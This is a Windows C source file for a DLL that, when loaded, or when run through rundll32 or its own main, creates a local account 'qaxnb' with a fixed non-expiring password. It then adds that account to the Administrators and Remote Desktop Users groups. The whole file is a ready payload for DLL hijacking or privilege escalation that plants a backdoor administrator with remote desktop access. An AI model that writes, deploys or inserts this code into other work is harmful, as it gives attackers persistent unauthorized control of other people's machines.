#include <windows.h>
#include <lm.h>
#include <stdio.h>

#pragma comment(lib, "netapi32.lib")

void AddUser()
{
	USER_INFO_1 userInfo;
	DWORD dwLevel = 1;
	DWORD dwError = 0;


	userInfo.usri1_name = L"qaxnb";
	userInfo.usri1_password = L"Aa@123456";
	userInfo.usri1_priv = USER_PRIV_USER;
	userInfo.usri1_home_dir = NULL;
	userInfo.usri1_comment = NULL;
	userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
	userInfo.usri1_script_path = NULL;


	NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&userInfo, &dwError);

	if (nStatus == NERR_Success) {
	}
	else {
		return;
	}


	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = L"qaxnb";

	nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);

	if (nStatus == NERR_Success) {

	}
	else {
		return;
	}


	nStatus = NetLocalGroupAddMembers(NULL, L"Remote Desktop Users", 3, (LPBYTE)&account, 1);

	if (nStatus == NERR_Success) {

	}
	else {
		return;
	}
	return 0;
}

DWORD CreateAdminUserInternal(void)
{
	AddUser();
	return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateAdminUserInternal();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//
// RUNDLL32 entry point.
// https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface
//

#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

//
// Command-line entry point.
//

int main()
{
	return CreateAdminUserInternal();
}
